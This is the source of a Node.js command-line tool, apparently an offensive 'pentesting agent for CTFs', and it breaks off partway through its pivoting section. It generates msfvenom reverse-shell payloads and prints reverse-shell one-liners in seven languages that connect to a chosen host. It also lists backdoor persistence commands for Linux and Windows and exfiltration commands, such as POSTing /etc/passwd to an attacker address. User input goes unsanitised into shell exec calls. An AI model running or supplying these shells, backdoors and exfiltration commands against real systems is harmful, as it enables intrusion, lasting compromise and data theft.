#!/usr/bin/env node

import { Command } from 'commander';
import inquirer from 'inquirer';
import chalk from 'chalk';
import ora from 'ora';
import boxen from 'boxen';
import { exec } from 'child_process';
import { promisify } from 'util';
import fs from 'fs/promises';
import path from 'path';

const execAsync = promisify(exec);

const program = new Command();

// Banner
const banner = chalk.cyan(`
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║    ██████╗ ███████╗███╗   ██╗████████╗███████╗███████╗████████╗
║    ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
║    ██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ███████╗   ██║
║    ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ╚════██║   ██║
║    ██║     ███████╗██║ ╚████║   ██║   ███████╗███████║   ██║
║    ╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝
║                                                           ║
║          Advanced Pentesting CLI Agent for CTFs          ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
`);

// Utility functions
async function runCommand(command, description) {
  const spinner = ora(description).start();
  try {
    const { stdout, stderr } = await execAsync(command);
    spinner.succeed(chalk.green(description));
    return { stdout, stderr, success: true };
  } catch (error) {
    spinner.fail(chalk.red(description));
    return { stdout: error.stdout, stderr: error.stderr, error: error.message, success: false };
  }
}

// Reconnaissance Module
async function reconMode() {
  console.log(chalk.yellow('\n🔍 Reconnaissance Module\n'));

  const answers = await inquirer.prompt([
    {
      type: 'list',
      name: 'scanType',
      message: 'Select reconnaissance type:',
      choices: [
        'Network Scan (Nmap)',
        'Web Enumeration',
        'DNS Enumeration',
        'Subdomain Discovery',
        'Port Service Detection',
        'Vulnerability Scan',
        'Back'
      ]
    }
  ]);

  switch (answers.scanType) {
    case 'Network Scan (Nmap)':
      await nmapScan();
      break;
    case 'Web Enumeration':
      await webEnum();
      break;
    case 'DNS Enumeration':
      await dnsEnum();
      break;
    case 'Subdomain Discovery':
      await subdomainEnum();
      break;
    case 'Port Service Detection':
      await serviceDetection();
      break;
    case 'Vulnerability Scan':
      await vulnScan();
      break;
  }
}

async function nmapScan() {
  const { target } = await inquirer.prompt([
    {
      type: 'input',
      name: 'target',
      message: 'Enter target IP or hostname:',
      validate: (input) => input.length > 0 || 'Target is required'
    }
  ]);

  const { scanType } = await inquirer.prompt([
    {
      type: 'list',
      name: 'scanType',
      message: 'Select scan type:',
      choices: [
        'Quick Scan (-T4 -F)',
        'Full Port Scan (-p-)',
        'Aggressive Scan (-A)',
        'Stealth Scan (-sS)',
        'UDP Scan (-sU)',
        'Service Version Detection (-sV)',
        'OS Detection (-O)',
        'Custom'
      ]
    }
  ]);

  let nmapCommand = 'nmap';
  switch (scanType) {
    case 'Quick Scan (-T4 -F)':
      nmapCommand += ` -T4 -F ${target}`;
      break;
    case 'Full Port Scan (-p-)':
      nmapCommand += ` -p- ${target}`;
      break;
    case 'Aggressive Scan (-A)':
      nmapCommand += ` -A ${target}`;
      break;
    case 'Stealth Scan (-sS)':
      nmapCommand += ` -sS ${target}`;
      break;
    case 'UDP Scan (-sU)':
      nmapCommand += ` -sU ${target}`;
      break;
    case 'Service Version Detection (-sV)':
      nmapCommand += ` -sV ${target}`;
      break;
    case 'OS Detection (-O)':
      nmapCommand += ` -O ${target}`;
      break;
    case 'Custom':
      const { custom } = await inquirer.prompt([
        {
          type: 'input',
          name: 'custom',
          message: 'Enter custom nmap flags:',
        }
      ]);
      nmapCommand += ` ${custom} ${target}`;
      break;
  }

  console.log(chalk.cyan(`\n📡 Running: ${nmapCommand}\n`));
  const result = await runCommand(nmapCommand, 'Scanning target...');

  if (result.success) {
    console.log(chalk.green('\n✅ Scan Results:\n'));
    console.log(result.stdout);

    // Save results
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `nmap-${target}-${timestamp}.txt`;
    await fs.writeFile(filename, result.stdout);
    console.log(chalk.blue(`\n💾 Results saved to: ${filename}`));
  } else {
    console.log(chalk.red('\n❌ Scan failed:'));
    console.log(result.error);
  }
}

async function webEnum() {
  const { target } = await inquirer.prompt([
    {
      type: 'input',
      name: 'target',
      message: 'Enter target URL:',
      validate: (input) => input.length > 0 || 'URL is required'
    }
  ]);

  const { tool } = await inquirer.prompt([
    {
      type: 'list',
      name: 'tool',
      message: 'Select enumeration tool:',
      choices: [
        'Gobuster (Directory/File Discovery)',
        'Nikto (Web Vulnerability Scanner)',
        'WhatWeb (Technology Fingerprinting)',
        'WPScan (WordPress Scanner)',
        'SQLMap (SQL Injection)',
        'Custom cURL'
      ]
    }
  ]);

  switch (tool) {
    case 'Gobuster (Directory/File Discovery)':
      const { wordlist } = await inquirer.prompt([
        {
          type: 'list',
          name: 'wordlist',
          message: 'Select wordlist:',
          choices: [
            '/usr/share/wordlists/dirb/common.txt',
            '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt',
            '/usr/share/seclists/Discovery/Web-Content/common.txt',
            'Custom path'
          ]
        }
      ]);

      let wl = wordlist;
      if (wordlist === 'Custom path') {
        const { custom } = await inquirer.prompt([
          { type: 'input', name: 'custom', message: 'Enter wordlist path:' }
        ]);
        wl = custom;
      }

      const gobusterCmd = `gobuster dir -u ${target} -w ${wl} -t 50`;
      console.log(chalk.cyan(`\n🔍 Running: ${gobusterCmd}\n`));
      const gobusterResult = await runCommand(gobusterCmd, 'Enumerating directories...');
      if (gobusterResult.success) {
        console.log(chalk.green('\n✅ Enumeration Results:\n'));
        console.log(gobusterResult.stdout);
      }
      break;

    case 'Nikto (Web Vulnerability Scanner)':
      const niktoCmd = `nikto -h ${target}`;
      console.log(chalk.cyan(`\n🔍 Running: ${niktoCmd}\n`));
      const niktoResult = await runCommand(niktoCmd, 'Scanning for vulnerabilities...');
      if (niktoResult.success) {
        console.log(chalk.green('\n✅ Scan Results:\n'));
        console.log(niktoResult.stdout);
      }
      break;

    case 'WhatWeb (Technology Fingerprinting)':
      const whatwebCmd = `whatweb ${target} -v`;
      console.log(chalk.cyan(`\n🔍 Running: ${whatwebCmd}\n`));
      const whatwebResult = await runCommand(whatwebCmd, 'Fingerprinting technologies...');
      if (whatwebResult.success) {
        console.log(chalk.green('\n✅ Technology Stack:\n'));
        console.log(whatwebResult.stdout);
      }
      break;

    case 'WPScan (WordPress Scanner)':
      const wpscanCmd = `wpscan --url ${target} --enumerate vp,vt,u`;
      console.log(chalk.cyan(`\n🔍 Running: ${wpscanCmd}\n`));
      const wpscanResult = await runCommand(wpscanCmd, 'Scanning WordPress...');
      if (wpscanResult.success) {
        console.log(chalk.green('\n✅ WordPress Scan Results:\n'));
        console.log(wpscanResult.stdout);
      }
      break;

    case 'SQLMap (SQL Injection)':
      const { sqlmapUrl } = await inquirer.prompt([
        {
          type: 'input',
          name: 'sqlmapUrl',
          message: 'Enter vulnerable URL (with parameter):',
        }
      ]);
      const sqlmapCmd = `sqlmap -u "${sqlmapUrl}" --batch --random-agent`;
      console.log(chalk.cyan(`\n🔍 Running: ${sqlmapCmd}\n`));
      const sqlmapResult = await runCommand(sqlmapCmd, 'Testing for SQL injection...');
      if (sqlmapResult.success) {
        console.log(chalk.green('\n✅ SQLMap Results:\n'));
        console.log(sqlmapResult.stdout);
      }
      break;

    case 'Custom cURL':
      const { curlOpts } = await inquirer.prompt([
        {
          type: 'input',
          name: 'curlOpts',
          message: 'Enter cURL options:',
        }
      ]);
      const curlCmd = `curl ${curlOpts} ${target}`;
      console.log(chalk.cyan(`\n🔍 Running: ${curlCmd}\n`));
      const curlResult = await runCommand(curlCmd, 'Executing cURL...');
      if (curlResult.success) {
        console.log(chalk.green('\n✅ Response:\n'));
        console.log(curlResult.stdout);
      }
      break;
  }
}

async function dnsEnum() {
  const { domain } = await inquirer.prompt([
    {
      type: 'input',
      name: 'domain',
      message: 'Enter domain name:',
      validate: (input) => input.length > 0 || 'Domain is required'
    }
  ]);

  console.log(chalk.cyan('\n🔍 DNS Enumeration Starting...\n'));

  // Multiple DNS queries
  await runCommand(`dig ${domain} ANY`, 'Running dig ANY query...');
  await runCommand(`nslookup ${domain}`, 'Running nslookup...');
  await runCommand(`host -a ${domain}`, 'Running host query...');
  await runCommand(`fierce --domain ${domain}`, 'Running fierce DNS enumeration...');
}

async function subdomainEnum() {
  const { domain } = await inquirer.prompt([
    {
      type: 'input',
      name: 'domain',
      message: 'Enter domain name:',
      validate: (input) => input.length > 0 || 'Domain is required'
    }
  ]);

  const { tool } = await inquirer.prompt([
    {
      type: 'list',
      name: 'tool',
      message: 'Select subdomain enumeration tool:',
      choices: [
        'Sublist3r',
        'Amass',
        'DNSenum',
        'All'
      ]
    }
  ]);

  console.log(chalk.cyan('\n🔍 Subdomain Enumeration Starting...\n'));

  if (tool === 'Sublist3r' || tool === 'All') {
    await runCommand(`sublist3r -d ${domain}`, 'Running Sublist3r...');
  }
  if (tool === 'Amass' || tool === 'All') {
    await runCommand(`amass enum -d ${domain}`, 'Running Amass...');
  }
  if (tool === 'DNSenum' || tool === 'All') {
    await runCommand(`dnsenum ${domain}`, 'Running DNSenum...');
  }
}

async function serviceDetection() {
  const { target } = await inquirer.prompt([
    {
      type: 'input',
      name: 'target',
      message: 'Enter target IP:',
      validate: (input) => input.length > 0 || 'Target is required'
    }
  ]);

  const { port } = await inquirer.prompt([
    {
      type: 'input',
      name: 'port',
      message: 'Enter port (or leave empty for all):',
    }
  ]);

  const portFlag = port ? `-p ${port}` : '';
  const cmd = `nmap -sV -sC ${portFlag} ${target}`;

  console.log(chalk.cyan(`\n🔍 Running: ${cmd}\n`));
  const result = await runCommand(cmd, 'Detecting services...');

  if (result.success) {
    console.log(chalk.green('\n✅ Service Detection Results:\n'));
    console.log(result.stdout);
  }
}

async function vulnScan() {
  const { target } = await inquirer.prompt([
    {
      type: 'input',
      name: 'target',
      message: 'Enter target IP or hostname:',
      validate: (input) => input.length > 0 || 'Target is required'
    }
  ]);

  console.log(chalk.cyan('\n🔍 Running Vulnerability Scan...\n'));

  const nmapVulnCmd = `nmap --script vuln ${target}`;
  const result = await runCommand(nmapVulnCmd, 'Scanning for vulnerabilities...');

  if (result.success) {
    console.log(chalk.green('\n✅ Vulnerability Scan Results:\n'));
    console.log(result.stdout);
  }
}

// Exploitation Module
async function exploitMode() {
  console.log(chalk.red('\n💥 Exploitation Module\n'));

  const answers = await inquirer.prompt([
    {
      type: 'list',
      name: 'exploitType',
      message: 'Select exploitation technique:',
      choices: [
        'Metasploit Console',
        'Generate Payload',
        'Reverse Shell Helper',
        'Privilege Escalation Check',
        'Password Cracking',
        'Hash Identification',
        'Back'
      ]
    }
  ]);

  switch (answers.exploitType) {
    case 'Metasploit Console':
      await metasploitHelper();
      break;
    case 'Generate Payload':
      await payloadGenerator();
      break;
    case 'Reverse Shell Helper':
      await reverseShellHelper();
      break;
    case 'Privilege Escalation Check':
      await privescCheck();
      break;
    case 'Password Cracking':
      await passwordCracking();
      break;
    case 'Hash Identification':
      await hashIdentification();
      break;
  }
}

async function metasploitHelper() {
  console.log(chalk.yellow('\n🎯 Starting Metasploit Console...\n'));
  console.log(chalk.cyan('Tip: Use "search", "use", "set RHOST", "set LHOST", "exploit" commands\n'));

  const { confirm } = await inquirer.prompt([
    {
      type: 'confirm',
      name: 'confirm',
      message: 'Launch msfconsole?',
      default: true
    }
  ]);

  if (confirm) {
    await runCommand('msfconsole', 'Launching Metasploit...');
  }
}

async function payloadGenerator() {
  const answers = await inquirer.prompt([
    {
      type: 'list',
      name: 'payloadType',
      message: 'Select payload type:',
      choices: [
        'Windows Reverse Shell (exe)',
        'Linux Reverse Shell (elf)',
        'PHP Reverse Shell',
        'Java Reverse Shell',
        'Python Reverse Shell',
        'PowerShell Reverse Shell',
        'Custom msfvenom'
      ]
    },
    {
      type: 'input',
      name: 'lhost',
      message: 'Enter LHOST (your IP):',
      validate: (input) => input.length > 0 || 'LHOST is required'
    },
    {
      type: 'input',
      name: 'lport',
      message: 'Enter LPORT:',
      default: '4444'
    }
  ]);

  let cmd = '';
  let filename = '';

  switch (answers.payloadType) {
    case 'Windows Reverse Shell (exe)':
      filename = 'payload.exe';
      cmd = `msfvenom -p windows/meterpreter/reverse_tcp LHOST=${answers.lhost} LPORT=${answers.lport} -f exe -o ${filename}`;
      break;
    case 'Linux Reverse Shell (elf)':
      filename = 'payload.elf';
      cmd = `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=${answers.lhost} LPORT=${answers.lport} -f elf -o ${filename}`;
      break;
    case 'PHP Reverse Shell':
      filename = 'payload.php';
      cmd = `msfvenom -p php/meterpreter/reverse_tcp LHOST=${answers.lhost} LPORT=${answers.lport} -f raw -o ${filename}`;
      break;
    case 'Java Reverse Shell':
      filename = 'payload.jar';
      cmd = `msfvenom -p java/meterpreter/reverse_tcp LHOST=${answers.lhost} LPORT=${answers.lport} -f jar -o ${filename}`;
      break;
    case 'Python Reverse Shell':
      filename = 'payload.py';
      cmd = `msfvenom -p python/meterpreter/reverse_tcp LHOST=${answers.lhost} LPORT=${answers.lport} -f raw -o ${filename}`;
      break;
    case 'PowerShell Reverse Shell':
      filename = 'payload.ps1';
      cmd = `msfvenom -p windows/powershell_reverse_tcp LHOST=${answers.lhost} LPORT=${answers.lport} -f raw -o ${filename}`;
      break;
    case 'Custom msfvenom':
      const { custom } = await inquirer.prompt([
        {
          type: 'input',
          name: 'custom',
          message: 'Enter msfvenom command:',
        }
      ]);
      cmd = custom;
      break;
  }

  console.log(chalk.cyan(`\n🔧 Generating payload...\n`));
  console.log(chalk.gray(`Command: ${cmd}\n`));

  const result = await runCommand(cmd, 'Creating payload...');

  if (result.success) {
    console.log(chalk.green(`\n✅ Payload generated successfully!`));
    if (filename) {
      console.log(chalk.blue(`📦 Saved as: ${filename}`));
    }
    console.log(chalk.yellow(`\n⚠️  Don't forget to set up a listener!`));
    console.log(chalk.cyan(`Listener command: msfconsole -x "use exploit/multi/handler; set payload <payload>; set LHOST ${answers.lhost}; set LPORT ${answers.lport}; exploit"`));
  }
}

async function reverseShellHelper() {
  const answers = await inquirer.prompt([
    {
      type: 'list',
      name: 'shellType',
      message: 'Select reverse shell type:',
      choices: [
        'Bash',
        'Netcat',
        'Python',
        'PHP',
        'Perl',
        'Ruby',
        'PowerShell',
        'All (Show all options)'
      ]
    },
    {
      type: 'input',
      name: 'ip',
      message: 'Enter your IP:',
      validate: (input) => input.length > 0 || 'IP is required'
    },
    {
      type: 'input',
      name: 'port',
      message: 'Enter your port:',
      default: '4444'
    }
  ]);

  const shells = {
    'Bash': `bash -i >& /dev/tcp/${answers.ip}/${answers.port} 0>&1`,
    'Netcat': `nc -e /bin/bash ${answers.ip} ${answers.port}`,
    'Python': `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${answers.ip}",${answers.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
    'PHP': `php -r '$sock=fsockopen("${answers.ip}",${answers.port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    'Perl': `perl -e 'use Socket;$i="${answers.ip}";$p=${answers.port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    'Ruby': `ruby -rsocket -e'f=TCPSocket.open("${answers.ip}",${answers.port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
    'PowerShell': `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${answers.ip}",${answers.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
  };

  console.log(chalk.green('\n🐚 Reverse Shell Commands:\n'));

  if (answers.shellType === 'All (Show all options)') {
    for (const [type, command] of Object.entries(shells)) {
      console.log(chalk.yellow(`\n${type}:`));
      console.log(chalk.cyan(command));
    }
  } else {
    console.log(chalk.cyan(shells[answers.shellType]));
  }

  console.log(chalk.yellow(`\n\n⚠️  Don't forget to start a listener:`));
  console.log(chalk.cyan(`nc -lvnp ${answers.port}`));
}

async function privescCheck() {
  console.log(chalk.yellow('\n🔐 Privilege Escalation Checklist\n'));

  const { system } = await inquirer.prompt([
    {
      type: 'list',
      name: 'system',
      message: 'Select target system:',
      choices: ['Linux', 'Windows']
    }
  ]);

  if (system === 'Linux') {
    console.log(chalk.cyan('\n📋 Linux Privilege Escalation Commands:\n'));

    const linuxCommands = [
      { desc: 'Check sudo permissions', cmd: 'sudo -l' },
      { desc: 'Find SUID binaries', cmd: 'find / -perm -u=s -type f 2>/dev/null' },
      { desc: 'Find writable files', cmd: 'find / -writable -type f 2>/dev/null | grep -v proc' },
      { desc: 'Check cron jobs', cmd: 'cat /etc/crontab' },
      { desc: 'Check kernel version', cmd: 'uname -a' },
      { desc: 'Check running processes', cmd: 'ps aux' },
      { desc: 'Check network connections', cmd: 'netstat -antup' },
      { desc: 'Check /etc/passwd', cmd: 'cat /etc/passwd' },
      { desc: 'Check /etc/shadow permissions', cmd: 'ls -la /etc/shadow' },
      { desc: 'Find interesting files', cmd: 'find / -name "*.txt" -o -name "*.conf" -o -name "*.config" 2>/dev/null | grep -v proc' }
    ];

    linuxCommands.forEach(({ desc, cmd }) => {
      console.log(chalk.yellow(`${desc}:`));
      console.log(chalk.green(cmd));
      console.log();
    });

    console.log(chalk.blue('\n💡 Automated Tools:'));
    console.log(chalk.cyan('LinPEAS: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh'));
    console.log(chalk.cyan('LinEnum: ./LinEnum.sh'));
    console.log(chalk.cyan('Linux Smart Enumeration: ./lse.sh -l1'));

  } else {
    console.log(chalk.cyan('\n📋 Windows Privilege Escalation Commands:\n'));

    const winCommands = [
      { desc: 'System information', cmd: 'systeminfo' },
      { desc: 'Current user privileges', cmd: 'whoami /priv' },
      { desc: 'User groups', cmd: 'whoami /groups' },
      { desc: 'All users', cmd: 'net users' },
      { desc: 'Local admins', cmd: 'net localgroup administrators' },
      { desc: 'Scheduled tasks', cmd: 'schtasks /query /fo LIST /v' },
      { desc: 'Running processes', cmd: 'tasklist /v' },
      { desc: 'Network connections', cmd: 'netstat -ano' },
      { desc: 'Firewall status', cmd: 'netsh firewall show state' },
      { desc: 'Installed patches', cmd: 'wmic qfe get Caption,Description,HotFixID,InstalledOn' }
    ];

    winCommands.forEach(({ desc, cmd }) => {
      console.log(chalk.yellow(`${desc}:`));
      console.log(chalk.green(cmd));
      console.log();
    });

    console.log(chalk.blue('\n💡 Automated Tools:'));
    console.log(chalk.cyan('WinPEAS: winPEASx64.exe'));
    console.log(chalk.cyan('PowerUp: powershell -ep bypass -c ". .\\PowerUp.ps1; Invoke-AllChecks"'));
    console.log(chalk.cyan('Seatbelt: Seatbelt.exe -group=all'));
  }
}

async function passwordCracking() {
  const answers = await inquirer.prompt([
    {
      type: 'list',
      name: 'tool',
      message: 'Select password cracking tool:',
      choices: ['John the Ripper', 'Hashcat', 'Hydra (Online)', 'CrackMapExec']
    }
  ]);

  switch (answers.tool) {
    case 'John the Ripper':
      const { hashFile } = await inquirer.prompt([
        {
          type: 'input',
          name: 'hashFile',
          message: 'Enter hash file path:',
          validate: (input) => input.length > 0 || 'Hash file is required'
        }
      ]);

      const { wordlistJohn } = await inquirer.prompt([
        {
          type: 'list',
          name: 'wordlistJohn',
          message: 'Select wordlist:',
          choices: [
            '/usr/share/wordlists/rockyou.txt',
            '/usr/share/john/password.lst',
            'Custom'
          ]
        }
      ]);

      let wlJohn = wordlistJohn;
      if (wordlistJohn === 'Custom') {
        const { custom } = await inquirer.prompt([
          { type: 'input', name: 'custom', message: 'Enter wordlist path:' }
        ]);
        wlJohn = custom;
      }

      const johnCmd = `john ${hashFile} --wordlist=${wlJohn}`;
      console.log(chalk.cyan(`\n🔓 Running: ${johnCmd}\n`));
      await runCommand(johnCmd, 'Cracking passwords...');
      break;

    case 'Hashcat':
      const { hashcatHash } = await inquirer.prompt([
        {
          type: 'input',
          name: 'hashcatHash',
          message: 'Enter hash or hash file:',
        }
      ]);

      const { hashType } = await inquirer.prompt([
        {
          type: 'list',
          name: 'hashType',
          message: 'Select hash type:',
          choices: [
            '0 - MD5',
            '100 - SHA1',
            '1000 - NTLM',
            '1400 - SHA256',
            '1700 - SHA512',
            '3200 - bcrypt',
            'Custom'
          ]
        }
      ]);

      let hashMode = hashType.split(' ')[0];
      if (hashType === 'Custom') {
        const { custom } = await inquirer.prompt([
          { type: 'input', name: 'custom', message: 'Enter hash mode:' }
        ]);
        hashMode = custom;
      }

      const { wordlistHashcat } = await inquirer.prompt([
        {
          type: 'input',
          name: 'wordlistHashcat',
          message: 'Enter wordlist path:',
          default: '/usr/share/wordlists/rockyou.txt'
        }
      ]);

      const hashcatCmd = `hashcat -m ${hashMode} ${hashcatHash} ${wordlistHashcat}`;
      console.log(chalk.cyan(`\n🔓 Running: ${hashcatCmd}\n`));
      await runCommand(hashcatCmd, 'Cracking with Hashcat...');
      break;

    case 'Hydra (Online)':
      const hydraAnswers = await inquirer.prompt([
        {
          type: 'input',
          name: 'target',
          message: 'Enter target IP/hostname:',
        },
        {
          type: 'list',
          name: 'service',
          message: 'Select service:',
          choices: ['ssh', 'ftp', 'http-post-form', 'rdp', 'smb', 'mysql', 'vnc']
        },
        {
          type: 'input',
          name: 'username',
          message: 'Enter username (or username file with -L):',
        },
        {
          type: 'input',
          name: 'wordlist',
          message: 'Enter password wordlist:',
          default: '/usr/share/wordlists/rockyou.txt'
        }
      ]);

      const hydraCmd = `hydra -l ${hydraAnswers.username} -P ${hydraAnswers.wordlist} ${hydraAnswers.target} ${hydraAnswers.service}`;
      console.log(chalk.cyan(`\n🔓 Running: ${hydraCmd}\n`));
      await runCommand(hydraCmd, 'Brute forcing credentials...');
      break;

    case 'CrackMapExec':
      const cmeAnswers = await inquirer.prompt([
        {
          type: 'input',
          name: 'target',
          message: 'Enter target IP/network:',
        },
        {
          type: 'list',
          name: 'protocol',
          message: 'Select protocol:',
          choices: ['smb', 'winrm', 'ssh', 'mssql', 'ldap']
        },
        {
          type: 'input',
          name: 'userlist',
          message: 'Enter username list:',
        },
        {
          type: 'input',
          name: 'passlist',
          message: 'Enter password list:',
        }
      ]);

      const cmeCmd = `crackmapexec ${cmeAnswers.protocol} ${cmeAnswers.target} -u ${cmeAnswers.userlist} -p ${cmeAnswers.passlist}`;
      console.log(chalk.cyan(`\n🔓 Running: ${cmeCmd}\n`));
      await runCommand(cmeCmd, 'Testing credentials...');
      break;
  }
}

async function hashIdentification() {
  const { hash } = await inquirer.prompt([
    {
      type: 'input',
      name: 'hash',
      message: 'Enter hash to identify:',
      validate: (input) => input.length > 0 || 'Hash is required'
    }
  ]);

  console.log(chalk.cyan('\n🔍 Identifying hash...\n'));

  await runCommand(`hash-identifier`, 'Running hash-identifier...');
  await runCommand(`hashid '${hash}'`, 'Running hashid...');
}

// Post-Exploitation Module
async function postExploitMode() {
  console.log(chalk.magenta('\n🎯 Post-Exploitation Module\n'));

  const answers = await inquirer.prompt([
    {
      type: 'list',
      name: 'action',
      message: 'Select post-exploitation action:',
      choices: [
        'File Transfer Helper',
        'Persistence Techniques',
        'Data Exfiltration',
        'Network Pivoting',
        'Lateral Movement',
        'Covering Tracks',
        'Back'
      ]
    }
  ]);

  switch (answers.action) {
    case 'File Transfer Helper':
      await fileTransferHelper();
      break;
    case 'Persistence Techniques':
      await persistenceHelper();
      break;
    case 'Data Exfiltration':
      await exfiltrationHelper();
      break;
    case 'Network Pivoting':
      await pivotingHelper();
      break;
    case 'Lateral Movement':
      await lateralMovementHelper();
      break;
    case 'Covering Tracks':
      await coverTracksHelper();
      break;
  }
}

async function fileTransferHelper() {
  const answers = await inquirer.prompt([
    {
      type: 'list',
      name: 'method',
      message: 'Select file transfer method:',
      choices: [
        'HTTP Server (Python)',
        'SCP',
        'Netcat',
        'Base64 Encoding',
        'PowerShell Download',
        'cURL/Wget',
        'FTP Server'
      ]
    }
  ]);

  console.log(chalk.green('\n📁 File Transfer Commands:\n'));

  switch (answers.method) {
    case 'HTTP Server (Python)':
      const { port } = await inquirer.prompt([
        { type: 'input', name: 'port', message: 'Enter port:', default: '8000' }
      ]);
      console.log(chalk.yellow('Start HTTP server:'));
      console.log(chalk.cyan(`python3 -m http.server ${port}`));
      console.log(chalk.yellow('\nDownload from target:'));
      console.log(chalk.cyan(`wget http://<your-ip>:${port}/<file>`));
      console.log(chalk.cyan(`curl -O http://<your-ip>:${port}/<file>`));
      break;

    case 'SCP':
      console.log(chalk.yellow('Upload to target:'));
      console.log(chalk.cyan('scp <local-file> user@target:/path/to/destination'));
      console.log(chalk.yellow('\nDownload from target:'));
      console.log(chalk.cyan('scp user@target:/path/to/file <local-destination>'));
      break;

    case 'Netcat':
      console.log(chalk.yellow('Sender (has the file):'));
      console.log(chalk.cyan('nc -lvnp 4444 < file.txt'));
      console.log(chalk.yellow('\nReceiver:'));
      console.log(chalk.cyan('nc <sender-ip> 4444 > file.txt'));
      break;

    case 'Base64 Encoding':
      console.log(chalk.yellow('Encode file:'));
      console.log(chalk.cyan('base64 file.txt'));
      console.log(chalk.yellow('\nDecode on target:'));
      console.log(chalk.cyan('echo "<base64-string>" | base64 -d > file.txt'));
      break;

    case 'PowerShell Download':
      console.log(chalk.yellow('PowerShell download:'));
      console.log(chalk.cyan('powershell -c "Invoke-WebRequest -Uri http://<your-ip>/file.exe -OutFile C:\\\\temp\\\\file.exe"'));
      console.log(chalk.cyan('certutil -urlcache -f http://<your-ip>/file.exe file.exe'));
      break;

    case 'cURL/Wget':
      console.log(chalk.yellow('Download file:'));
      console.log(chalk.cyan('wget http://<your-ip>/file'));
      console.log(chalk.cyan('curl -O http://<your-ip>/file'));
      console.log(chalk.yellow('\nUpload file (POST):'));
      console.log(chalk.cyan('curl -X POST -F "file=@/path/to/file" http://<your-ip>'));
      break;

    case 'FTP Server':
      console.log(chalk.yellow('Start Python FTP server:'));
      console.log(chalk.cyan('python -m pyftpdlib -p 21'));
      console.log(chalk.yellow('\nConnect from target:'));
      console.log(chalk.cyan('ftp <your-ip>'));
      break;
  }
}

async function persistenceHelper() {
  const { system } = await inquirer.prompt([
    {
      type: 'list',
      name: 'system',
      message: 'Select target system:',
      choices: ['Linux', 'Windows']
    }
  ]);

  console.log(chalk.red('\n🔒 Persistence Techniques:\n'));

  if (system === 'Linux') {
    console.log(chalk.yellow('1. Cron Job:'));
    console.log(chalk.cyan('(crontab -l; echo "* * * * * /tmp/shell.sh") | crontab -'));

    console.log(chalk.yellow('\n2. SSH Keys:'));
    console.log(chalk.cyan('mkdir -p ~/.ssh && echo "<your-public-key>" >> ~/.ssh/authorized_keys'));

    console.log(chalk.yellow('\n3. Bashrc:'));
    console.log(chalk.cyan('echo "/tmp/shell.sh" >> ~/.bashrc'));

    console.log(chalk.yellow('\n4. Systemd Service:'));
    console.log(chalk.cyan('Create service file in /etc/systemd/system/'));

    console.log(chalk.yellow('\n5. LD_PRELOAD:'));
    console.log(chalk.cyan('echo "/path/to/malicious.so" > /etc/ld.so.preload'));

  } else {
    console.log(chalk.yellow('1. Registry Run Key:'));
    console.log(chalk.cyan('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Backdoor /t REG_SZ /d "C:\\path\\to\\backdoor.exe"'));

    console.log(chalk.yellow('\n2. Scheduled Task:'));
    console.log(chalk.cyan('schtasks /create /tn "Update" /tr "C:\\path\\to\\backdoor.exe" /sc onlogon /ru System'));

    console.log(chalk.yellow('\n3. Startup Folder:'));
    console.log(chalk.cyan('copy backdoor.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"'));

    console.log(chalk.yellow('\n4. Service:'));
    console.log(chalk.cyan('sc create MyService binPath= "C:\\path\\to\\backdoor.exe" start= auto'));

    console.log(chalk.yellow('\n5. WMI Event Subscription:'));
    console.log(chalk.cyan('Use PowerShell to create WMI event subscription'));
  }
}

async function exfiltrationHelper() {
  console.log(chalk.blue('\n📤 Data Exfiltration Methods:\n'));

  console.log(chalk.yellow('1. HTTP POST:'));
  console.log(chalk.cyan('curl -X POST -d @/etc/passwd http://<your-ip>:8000'));

  console.log(chalk.yellow('\n2. DNS Exfiltration:'));
  console.log(chalk.cyan('for i in $(cat data.txt); do dig $i.<your-domain>; done'));

  console.log(chalk.yellow('\n3. ICMP Exfiltration:'));
  console.log(chalk.cyan('ping -c 1 -p $(xxd -p -c 1 file.txt) <your-ip>'));

  console.log(chalk.yellow('\n4. Base64 over HTTP:'));
  console.log(chalk.cyan('curl http://<your-ip>:8000/$(base64 file.txt)'));

  console.log(chalk.yellow('\n5. Netcat:'));
  console.log(chalk.cyan('cat file.txt | nc <your-ip> 4444'));

  console.log(chalk.yellow('\n6. SCP:'));
  console.log(chalk.cyan('scp file.txt user@<your-ip>:/path/'));

  console.log(chalk.yellow('\n7. Email:'));
  console.log(chalk.cyan('echo "data" | mail -s "Subject" attacker@email.com'));
}

async function pivotingHelper() {
  console.log(chalk.green('\n🔄 Network Pivoting Techniques:\n'));

  console.log(chalk.yellow('1. SSH Local Port Forwarding:'));
